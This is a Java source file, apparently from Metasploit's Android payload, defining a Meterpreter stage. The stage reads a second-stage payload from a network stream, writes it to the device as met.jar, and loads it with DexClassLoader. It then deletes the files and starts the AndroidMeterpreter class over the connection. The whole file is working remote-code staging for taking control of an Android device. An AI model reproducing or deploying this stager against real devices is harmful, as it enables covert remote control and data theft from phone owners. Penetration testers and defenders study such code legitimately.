
package androidpayload.stage;
import android.util.Log;

import java.io.DataInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStream;

import dalvik.system.DexClassLoader;
import javapayload.stage.Stage;

/**
 * Meterpreter Android Payload Proxy
 */
public class Meterpreter implements Stage {

    public void start(DataInputStream in, OutputStream out, String[] parameters) throws Exception {
        Log.d("msf", "Meterpreter stage constructing");
        String path = parameters[0];
        String filePath = path + File.separatorChar + "met.jar";
        String dexPath = path + File.separatorChar + "met.dex";

        // Read the stage
        int coreLen = in.readInt();
        byte[] core = new byte[coreLen];
        in.readFully(core);
        Log.d("msf", "Meterpreter stage 2 length: " + coreLen);

        // Write the stage to /data/data/.../files/
        Log.d("msf", "Meterpreter stage 2 writing to: " + filePath);
        File file = new File(filePath);
        if (!file.exists()) {
            file.createNewFile();
        }
        FileOutputStream fop = new FileOutputStream(file);
        fop.write(core);
        fop.flush();
        fop.close();

        // Load the stage
        DexClassLoader classLoader = new DexClassLoader(filePath, path, path, Meterpreter.class.getClassLoader());
        Class<?> myClass = classLoader.loadClass("com.metasploit.meterpreter.AndroidMeterpreter");
        Log.d("msf", "Class loading " + (classLoader == null ? "failed" : "succeeded"));
        file.delete();
        new File(dexPath).delete();
        Log.d("msf", "Calling constructor");
        myClass.getConstructor(new Class[]{
                DataInputStream.class, OutputStream.class, String[].class, boolean.class
        }).newInstance(in, out, parameters, false);
    }
}
